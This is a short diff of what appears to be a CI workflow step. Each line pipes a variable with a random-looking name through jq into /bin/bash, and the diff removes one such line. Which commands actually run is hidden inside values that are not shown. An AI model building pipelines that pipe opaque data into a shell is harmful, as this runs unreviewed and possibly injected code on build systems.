@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$luxh302" | jq -r .zh38473 | /bin/bash
           printf '%s' "$szi00473" | jq -r .zbj21 | /bin/bash
-          echo $ilpwk87293 | jq -r .gpgp9213 | /bin/bash
           echo $mlhh95423 | jq -r .lfphr51180 | /bin/bash
 
       - name: Archive output
